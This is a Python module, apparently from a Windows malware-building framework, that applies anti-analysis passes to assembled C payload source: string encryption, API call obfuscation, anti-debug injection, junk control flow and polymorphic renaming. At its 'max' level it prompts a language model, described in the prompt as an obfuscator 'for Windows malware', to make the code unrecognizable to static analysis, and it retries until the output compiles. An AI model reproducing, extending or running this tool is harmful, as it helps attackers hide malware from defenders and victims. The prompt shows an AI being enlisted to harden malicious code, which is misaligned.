"""Post-assembly source-level obfuscation for the chunk pipeline.

Applies the same battle-tested evasion passes from evasion_passes.py,
plus an optional LLM-powered rewrite pass for deeper obfuscation.

Usage:
    from templates.chunks.obfuscate import obfuscate
    source = obfuscate(assembled_source, level="heavy")

Levels:
    none  — no transforms (passthrough)
    light — sanitize headers + rename local vars + junk blocks + string encrypt
    heavy — all of light + API obfuscation + anti-debug + SEH (default)
    max   — all of heavy + LLM rewrite (function rename, control flow, dead code)
"""

import logging
import os
import re
import sys

_FRAMEWORK_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _FRAMEWORK_ROOT not in sys.path:
    sys.path.insert(0, _FRAMEWORK_ROOT)

from evasion_passes import (
    _encrypt_string_literals,
    _inject_anti_debug,
    _inject_control_flow_junk,
    _inject_seh_in_main,
    _mutate_source,
    _obfuscate_api_calls,
    _sanitize_includes,
)

logger = logging.getLogger(__name__)


def _has_chunk_guard(source: str, guard: str) -> bool:
    return guard in source


def _expand_define_strings(source: str) -> str:
    """Convert #define NAME "string" into static char* NAME = "string" so string
    encryption can reach them. Only targets defines whose value is a quoted string.
    Handles duplicate defines (from multiple chunks) by keeping only the first."""
    lines = source.split('\n')
    define_re = re.compile(r'^(\s*)#define\s+([A-Z_][A-Z0-9_]*)\s+"([^"]*)"')
    replacements = {}
    new_lines = []
    for line in lines:
        m = define_re.match(line)
        if m:
            indent, name, value = m.group(1), m.group(2), m.group(3)
            if name in replacements:
                new_lines.append(f'{indent}/* dup {name} removed */')
            else:
                replacements[name] = value
                new_lines.append(f'{indent}static char *_{name}_v = "{value}";')
        else:
            new_lines.append(line)
    source = '\n'.join(new_lines)
    for name in replacements:
        source = re.sub(r'\b' + name + r'\b', f'_{name}_v', source)
        source = source.replace(f'#define _{name}_v', f'#define {name}')
        source = source.replace(f'#ifndef _{name}_v', f'#ifndef {name}')
        source = source.replace(f'#ifdef _{name}_v', f'#ifdef {name}')
    return source


def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
    if level == "none":
        return source

    logger.info("Obfuscation pass: level=%s", level)

    has_anti_debug = _has_chunk_guard(source, "CHUNK_ANTI_DEBUG")
    has_api_hash = _has_chunk_guard(source, "CHUNK_API_HASH")
    has_string_encrypt = _has_chunk_guard(source, "CHUNK_STRING_ENCRYPT")
    is_individual_chunk = "CHUNK_" in source and "emit_buffer" not in source

    # 1. Sanitize includes (always)
    source = _sanitize_includes(source, os_platform="windows")

    # 2. Polymorphic mutation — rename local vars, inject junk blocks, split ints
    source = _mutate_source(source, os_platform="windows")

    # 2b. Control-flow junk — bogus branches with opaque predicates
    source = _inject_control_flow_junk(source)

    if level in ("heavy", "max"):

        # 3. SEH wrapper — skip for chunk code (breaks argc/argv + 30s timeout kills collectors)
        if not is_individual_chunk:
            source = _inject_seh_in_main(source)
        else:
            logger.info("Skipping SEH injection (chunk-assembled code)")

        # 4. Anti-debug (skip if chunk already has it or is chunk code)
        if not has_anti_debug and not is_individual_chunk:
            source = _inject_anti_debug(source)
        else:
            logger.info("Skipping anti-debug injection (chunk code or CHUNK_ANTI_DEBUG present)")

        # 5. API obfuscation (skip if chunk already has hash-based resolution)
        if not has_api_hash:
            source = _obfuscate_api_calls(source)
        else:
            logger.info("Skipping API obfuscation (CHUNK_API_HASH present)")

    if level == "max":
        from atelier.llm_client import _discover_llm_url
        url = llm_url or os.environ.get("LLM_URL", "") or _discover_llm_url()
        model = os.environ.get("LLM_MODEL", "")
        source = _llm_obfuscate(source, url, model=model)

    # Convert #define string macros to globals so string encryption can reach them
    if not is_individual_chunk:
        source = _expand_define_strings(source)

    # String encryption always last (skip if chunk already encrypts or is chunk code)
    if not has_string_encrypt and not is_individual_chunk:
        source = _encrypt_string_literals(source)
    else:
        logger.info("Skipping string encryption (chunk code or CHUNK_STRING_ENCRYPT present)")

    return source


_LLM_PROMPT = """You are a C code obfuscator for Windows malware. Rewrite the following C source to be functionally identical but unrecognizable to static analysis. You MUST:

1. Rename ALL static functions to generic names like init_module_N, process_data_N, handle_event_N, update_state_N (where N is a number). Update ALL callers, forward declarations, and function pointer references.
2. Reorder function definitions randomly (main/WinMain stays last).
3. Replace readable section marker strings (like "=== SYSTEM INFO ===") with computed/obfuscated markers that produce the same bytes at runtime.
4. Split any function longer than 40 lines into 2-3 smaller functions with opaque names.
5. Add 3-5 realistic dead code paths — code that references real variables and calls real APIs but is guarded by conditions that are always false (e.g., `if (GetTickCount() == 0)`, `if (sizeof(void*) > 16)`).
6. DO NOT change any #include, #define, #ifndef, #endif, or typedef lines.
7. DO NOT change function signatures that are Windows API callbacks (WINAPI, CALLBACK, etc.).
8. DO NOT remove or change any functionality — the code must behave identically.
9. DO NOT add comments or explanations — output ONLY the complete C source.

The code MUST compile cleanly with:
x86_64-w64-mingw32-gcc -o out.exe source.c -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 -lwininet -ldnsapi -static

SOURCE:
"""


def _llm_obfuscate(source: str, llm_url: str, max_attempts: int = 3, model: str = "") -> str:
    try:
        import requests
    except ImportError:
        logger.warning("requests not installed, skipping LLM obfuscation")
        return source

    prompt = _LLM_PROMPT + source
    req_body = {
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": 16384,
        "temperature": 0.7,
    }
    if model:
        req_body["model"] = model

    for attempt in range(1, max_attempts + 1):
        logger.info("LLM obfuscation attempt %d/%d", attempt, max_attempts)
        try:
            url = llm_url.rstrip("/")
            if url.endswith("/v1"):
                url = f"{url}/chat/completions"
            else:
                url = f"{url}/v1/chat/completions"
            resp = requests.post(url, json=req_body, timeout=300)
            resp.raise_for_status()
            content = resp.json()["choices"][0]["message"]["content"]

            rewritten = _extract_code(content)
            if not rewritten:
                logger.warning("LLM returned no extractable code, using original")
                return source

            ok, error = _compile_check(rewritten)
            if ok:
                logger.info("LLM obfuscation compiled successfully")
                return rewritten

            logger.warning("LLM rewrite failed to compile: %s", error[:200])
            prompt = (
                f"The rewritten code failed to compile with this error:\n{error}\n\n"
                f"Fix the code so it compiles. Output ONLY the complete fixed C source.\n\n"
                f"BROKEN SOURCE:\n{rewritten}"
            )

        except Exception as e:
            logger.warning("LLM obfuscation attempt %d failed: %s", attempt, e)

    logger.warning("LLM obfuscation failed after %d attempts, using regex-obfuscated source", max_attempts)
    return source


def _extract_code(llm_output: str) -> str:
    fenced = re.search(r"```(?:c)?\s*\n(.*?)```", llm_output, re.DOTALL)
    if fenced:
        return fenced.group(1).strip()

    if "#include" in llm_output and ("int main" in llm_output or "int WINAPI" in llm_output):
        lines = llm_output.split("\n")
        start = next((i for i, l in enumerate(lines) if l.strip().startswith("#include")), 0)
        return "\n".join(lines[start:]).strip()

    return ""


def _compile_check(source: str) -> tuple:
    import subprocess
    import tempfile

    with tempfile.NamedTemporaryFile(suffix=".c", mode="w", delete=False) as f:
        f.write(source)
        src_path = f.name

    exe_path = src_path.replace(".c", ".exe")
    try:
        result = subprocess.run(
            ["x86_64-w64-mingw32-gcc", "-o", exe_path, src_path,
             "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32",
             "-lshell32", "-lgdi32", "-lwininet", "-ldnsapi", "-static",
             "-fsyntax-only"],
            capture_output=True, text=True, timeout=30,
        )
        return result.returncode == 0, result.stderr
    except Exception as e:
        return False, str(e)
    finally:
        try:
            os.unlink(src_path)
        except OSError:
            pass
        try:
            os.unlink(exe_path)
        except OSError:
            pass


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Obfuscate assembled chunk source")
    parser.add_argument("input", help="Input .c file")
    parser.add_argument("-o", "--output", help="Output .c file (default: stdout)")
    parser.add_argument("-l", "--level", choices=["none", "light", "heavy", "max"],
                        default="heavy", help="Obfuscation level (default: heavy)")
    parser.add_argument("--llm-url", default=None, help="LLM API URL for max level")
    args = parser.parse_args()

    with open(args.input) as f:
        source = f.read()

    result = obfuscate(source, level=args.level, llm_url=args.llm_url)

    if args.output:
        with open(args.output, "w") as f:
            f.write(result)
        print(f"Obfuscated: {args.input} → {args.output} (level={args.level})")
    else:
        print(result)
